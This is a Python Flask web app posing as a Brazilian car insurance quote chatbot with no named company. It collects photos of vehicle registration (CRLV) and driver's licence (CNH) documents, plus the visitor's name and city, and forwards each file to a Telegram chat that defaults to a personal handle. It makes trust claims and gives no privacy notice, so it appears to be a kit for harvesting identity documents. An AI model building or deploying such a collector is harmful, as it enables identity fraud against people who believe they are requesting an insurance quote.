# Car Insurance Lead Bot - With Document Upload and Contact Info
# Environment variables: TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID

from flask import Flask, render_template_string, request, jsonify
import requests
import os
import random
from werkzeug.utils import secure_filename

app = Flask(__name__)

# Configuration from environment variables
TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '')
TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', '@Toustten')

# Allowed file types and max size
ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'pdf'}
MAX_FILE_SIZE = 10 * 1024 * 1024  # 10MB

# Knowledge base
KNOWLEDGE_BASE = {
    "greetings": ["oi", "ola", "e ai", "tudo bem", "bom dia", "boa tarde", "boa noite", "hey", "hi", "hello"],
    
    "opening_messages": [
        "Ola, tudo bem? Para que a gente possa estar providenciando a sua cotacao, eu preciso que me envie a foto do documento do seu veiculo."
    ],
    
    "contact_questions": {
        "name": "Obrigado pelo documento. Qual e o seu nome completo?",
        "city": "Em qual cidade voce reside?"
    },
    
    "document_received": "Documento recebido com sucesso. Obrigado!",
    
    "closing": "Perfeito. Encaminhei todas as informacoes para nosso consultor, que entrara em contato em breve. A disposicao!",
    
    "fallback_responses": [
        "Peco desculpas, nao compreendi. Pode repetir?",
        "Perdao, nao entendi. Como posso ajudar?"
    ]
}

# Conversation state
conversations = {}

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

def send_telegram_photo(photo_data, caption, filename):
    if not TELEGRAM_BOT_TOKEN:
        return False
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
    try:
        files = {'photo': (filename, photo_data, 'image/jpeg')}
        data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': caption}
        response = requests.post(url, files=files, data=data, timeout=30)
        return response.status_code == 200
    except:
        return False

def send_telegram_document(doc_data, caption, filename):
    if not TELEGRAM_BOT_TOKEN:
        return False
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
    try:
        files = {'document': (filename, doc_data, 'application/pdf')}
        data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': caption}
        response = requests.post(url, files=files, data=data, timeout=30)
        return response.status_code == 200
    except:
        return False

def get_bot_response(user_message, session_id):
    msg_lower = user_message.lower().strip()
    
    if session_id not in conversations:
        conversations[session_id] = {
            "step": "greeting", 
            "unknown_count": 0,
            "documents": {},
            "contact_info": {},
            "awaiting_contact": False,
            "contact_step": 0
        }
    
    conv = conversations[session_id]
    
    # Handle contact info collection
    if conv.get("awaiting_contact"):
        contact_step = conv.get("contact_step", 0)
        
        if contact_step == 0:
            conv["contact_info"]["name"] = user_message
            conv["contact_step"] = 1
            return KNOWLEDGE_BASE["contact_questions"]["city"]
        elif contact_step == 1:
            conv["contact_info"]["city"] = user_message
            conv["awaiting_contact"] = False
            return "Muito bem, " + conv["contact_info"]["name"] + ". Agora, se desejar, pode enviar mais documentos (CNH, CRLV) clicando no botao de anexo."
    
    # Check for greetings
    if any(greet in msg_lower for greet in KNOWLEDGE_BASE["greetings"]) and conv["step"] == "greeting":
        conv["step"] = "awaiting_document"
        return KNOWLEDGE_BASE["opening_messages"][0] + "\n\nClique no botao de anexo 📎 abaixo para enviar."
    
    # Default response
    conv["unknown_count"] = conv.get("unknown_count", 0) + 1
    if conv["unknown_count"] >= 2:
        conv["unknown_count"] = 0
        return "Vou encaminhar voce para um consultor. Um momento..."
    
    return KNOWLEDGE_BASE["fallback_responses"][0]

# HTML template
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Seguro Auto - Cotacao</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .chat-container {
            width: 100%;
            max-width: 420px;
            height: 85vh;
            min-height: 500px;
            background: white;
            border-radius: 24px;
            box-shadow: 0 25px 80px rgba(0,0,0,0.4);
            display: flex;
            flex-direction: column;
            overflow: hidden;
        }
        .chat-header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 24px 20px;
            text-align: center;
        }
        .chat-header h1 { font-size: 1.3rem; font-weight: 600; }
        .chat-header p { font-size: 0.9rem; opacity: 0.9; margin-top: 6px; }
        .chat-messages {
            flex: 1;
            overflow-y: auto;
            padding: 20px;
            display: flex;
            flex-direction: column;
            gap: 14px;
        }
        .message {
            max-width: 85%;
            padding: 14px 18px;
            border-radius: 20px;
            font-size: 0.95rem;
            line-height: 1.5;
            animation: fadeIn 0.3s ease;
            word-wrap: break-word;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .message.bot {
            background: #f0f2f5;
            color: #1a1a1a;
            align-self: flex-start;
            border-bottom-left-radius: 6px;
        }
        .message.user {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            align-self: flex-end;
            border-bottom-right-radius: 6px;
        }
        .message.file {
            background: #e8f4f8;
            color: #1a1a1a;
            align-self: flex-start;
            border-bottom-left-radius: 6px;
            border-left: 4px solid #667eea;
        }
        .chat-input {
            padding: 18px 20px;
            border-top: 1px solid #e8e8e8;
            display: flex;
            gap: 12px;
            background: #fafafa;
            align-items: center;
        }
        .chat-input input[type="text"] {
            flex: 1;
            padding: 14px 20px;
            border: 2px solid #e0e0e0;
            border-radius: 28px;
            font-size: 0.95rem;
            outline: none;
            transition: all 0.3s;
            background: white;
        }
        .chat-input input[type="text"]:focus {
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }
        .chat-input button {
            width: 50px;
            height: 50px;
            border: none;
            border-radius: 50%;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            font-size: 1.2rem;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.2s;
            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
        }
        .chat-input button:hover {
            transform: scale(1.05);
            box-shadow: 0 6px 20px rgba(102, 126, 234, 0.5);
        }
        .file-btn {
            width: 50px;
            height: 50px;
            border: 2px solid #667eea;
            border-radius: 50%;
            background: white;
            color: #667eea;
            font-size: 1.4rem;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.2s;
        }
        .file-btn:hover {
            background: #667eea;
            color: white;
        }
        .file-input {
            display: none;
        }
        .typing {
            display: none;
            align-self: flex-start;
            background: #f0f2f5;
            padding: 16px 20px;
            border-radius: 20px;
            border-bottom-left-radius: 6px;
            margin-left: 20px;
            margin-bottom: 10px;
        }
        .typing span {
            display: inline-block;
            width: 8px;
            height: 8px;
            background: #999;
            border-radius: 50%;
            margin: 0 3px;
            animation: typing 1.4s infinite;
        }
        .typing span:nth-child(2) { animation-delay: 0.2s; }
        .typing span:nth-child(3) { animation-delay: 0.4s; }
        @keyframes typing {
            0%, 60%, 100% { transform: translateY(0); }
            30% { transform: translateY(-10px); }
        }
        .footer {
            text-align: center;
            padding: 10px;
            font-size: 0.75rem;
            color: #999;
            background: #fafafa;
        }
        .upload-progress {
            display: none;
            padding: 10px 20px;
            background: #f0f2f5;
            text-align: center;
            font-size: 0.9rem;
            color: #667eea;
        }
        @media (max-width: 480px) {
            body { padding: 0; }
            .chat-container {
                height: 100vh;
                max-width: 100%;
                border-radius: 0;
            }
        }
    </style>
</head>
<body>
    <div class="chat-container">
        <div class="chat-header">
            <h1>🚗 Seguro Auto</h1>
            <p>Cotacao personalizada | Atendimento 24h</p>
        </div>
        <div class="chat-messages" id="messages">
            <div class="message bot">Ola, tudo bem? Para que a gente possa estar providenciando a sua cotacao, eu preciso que me envie a foto do documento do seu veiculo.<br><br>Clique no botao de anexo 📎 abaixo para enviar.</div>
        </div>
        <div class="typing" id="typing">
            <span></span><span></span><span></span>
        </div>
        <div class="upload-progress" id="uploadProgress">Enviando documento...</div>
        <div class="chat-input">
            <input type="file" id="fileInput" class="file-input" accept="image/*,.pdf">
            <button class="file-btn" onclick="document.getElementById('fileInput').click()" title="Enviar documento">📎</button>
            <input type="text" id="userInput" placeholder="Digite sua mensagem..." autocomplete="off">
            <button onclick="sendMessage()">➤</button>
        </div>
        <div class="footer">Atendimento seguro e profissional 🔒</div>
    </div>

    <script>
        const messagesDiv = document.getElementById('messages');
        const userInput = document.getElementById('userInput');
        const typingDiv = document.getElementById('typing');
        const fileInput = document.getElementById('fileInput');
        const uploadProgress = document.getElementById('uploadProgress');
        const sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);

        function addMessage(text, isUser, isFile = false) {
            const div = document.createElement('div');
            div.className = 'message ' + (isUser ? 'user' : isFile ? 'file' : 'bot');
           div.innerText = text;
            messagesDiv.appendChild(div);
            messagesDiv.scrollTop = messagesDiv.scrollHeight;
        }

        function showTyping() {
            typingDiv.style.display = 'block';
            messagesDiv.scrollTop = messagesDiv.scrollHeight;
        }

        function hideTyping() {
            typingDiv.style.display = 'none';
        }

        function showUploadProgress() {
            uploadProgress.style.display = 'block';
        }

        function hideUploadProgress() {
            uploadProgress.style.display = 'none';
        }

        async function sendMessage() {
            const text = userInput.value.trim();
            if (!text) return;

            addMessage(text, true);
            userInput.value = '';
            showTyping();

            try {
                const response = await fetch('/chat', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ message: text, session_id: sessionId })
                });
                const data = await response.json();
                
                setTimeout(() => {
                    hideTyping();
                    addMessage(data.response, false);
                }, 600 + Math.random() * 400);
            } catch (error) {
                hideTyping();
                addMessage('Peco desculpas, ocorreu um problema. Por favor, tente novamente.', false);
            }
        }

        async function uploadFile(file) {
            if (!file) return;

            const allowedTypes = ['image/jpeg', 'image/jpg', 'image/png', 'application/pdf'];
            const maxSize = 10 * 1024 * 1024;

            if (!allowedTypes.includes(file.type)) {
                addMessage('❌ Tipo de arquivo nao suportado. Envie apenas JPG, PNG ou PDF.', false);
                return;
            }

            if (file.size > maxSize) {
                addMessage('❌ Arquivo muito grande. Tamanho maximo: 10MB.', false);
                return;
            }

            showUploadProgress();
            addMessage('📎 Enviando: ' + file.name, true, true);

            const formData = new FormData();
            formData.append('file', file);
            formData.append('session_id', sessionId);

            try {
                const response = await fetch('/upload', {
                    method: 'POST',
                    body: formData
                });
                const data = await response.json();
                
                hideUploadProgress();
                addMessage(data.message, false);
            } catch (error) {
                hideUploadProgress();
                addMessage('❌ Erro ao enviar arquivo. Por favor, tente novamente.', false);
            }
        }

        fileInput.addEventListener('change', (e) => {
            const file = e.target.files[0];
            if (file) {
                uploadFile(file);
            }
            fileInput.value = '';
        });

        userInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') sendMessage();
        });

        userInput.focus();
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(HTML_TEMPLATE)

@app.route('/chat', methods=['POST'])
def chat():
    data = request.json
    user_message = data.get('message', '')
    session_id = data.get('session_id', 'default')
    response = get_bot_response(user_message, session_id)
    return jsonify({"response": response})

@app.route('/upload', methods=['POST'])
def upload_file():
    session_id = request.form.get('session_id', 'default')
    
    if session_id not in conversations:
        conversations[session_id] = {
            "step": "greeting", 
            "unknown_count": 0,
            "documents": {},
            "contact_info": {},
            "awaiting_contact": False,
            "contact_step": 0
        }
    
    conv = conversations[session_id]
    
    if 'file' not in request.files:
        return jsonify({"message": "Nenhum arquivo enviado."})
    
    file = request.files['file']
    
    if file.filename == '':
        return jsonify({"message": "Nenhum arquivo selecionado."})
    
    if file and allowed_file(file.filename):
        filename = secure_filename(file.filename)
        file_ext = filename.rsplit('.', 1)[1].lower()
        file_data = file.read()
        
        # Determine document type
        filename_lower = filename.lower()
        doc_type = "documento"
        doc_label = "Documento"
        
        if 'cnh' in filename_lower:
            doc_type = "cnh"
            doc_label = "CNH"
        elif 'crlv' in filename_lower or 'licenciamento' in filename_lower:
            doc_type = "crlv"
            doc_label = "CRLV"
        elif 'vin' in filename_lower or 'chassi' in filename_lower:
            doc_type = "vin"
            doc_label = "Foto do VIN/Chassi"
        
        conv["documents"][doc_type] = True
        
        # Send to Telegram
        caption = f"📎 {doc_label} recebido\nSessao: {session_id[:20]}..."
        
        success = False
        if file_ext in ['jpg', 'jpeg', 'png']:
            success = send_telegram_photo(file_data, caption, filename)
        elif file_ext == 'pdf':
            success = send_telegram_document(file_data, caption, filename)
        
        if success:
            # After first document, ask for contact info
            if not conv.get("contact_info", {}).get("name"):
                conv["awaiting_contact"] = True
                conv["contact_step"] = 0
                return jsonify({"message": KNOWLEDGE_BASE["document_received"] + "\n\n" + KNOWLEDGE_BASE["contact_questions"]["name"]})
            
            # Check if all documents received
            docs = conv.get("documents", {})
            if docs.get("cnh") and docs.get("crlv"):
                return jsonify({"message": KNOWLEDGE_BASE["document_received"] + "\n\n" + KNOWLEDGE_BASE["closing"]})
            else:
                missing = []
                if not docs.get("cnh"): missing.append("CNH")
                if not docs.get("crlv"): missing.append("CRLV")
                return jsonify({"message": KNOWLEDGE_BASE["document_received"] + "\n\nDocumentos pendentes: " + ", ".join(missing) + ". Pode enviar quando quiser!"})
        else:
            return jsonify({"message": "Documento recebido, mas houve um problema ao encaminhar."})
    
    return jsonify({"message": "Tipo de arquivo nao permitido. Envie apenas JPG, PNG ou PDF."})

@app.route('/health')
def health():
    return jsonify({"status": "ok"})

@app.route('/favicon.ico')
def favicon():
    return '', 204

if __name__ == '__main__':
    app.run(debug=False, host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
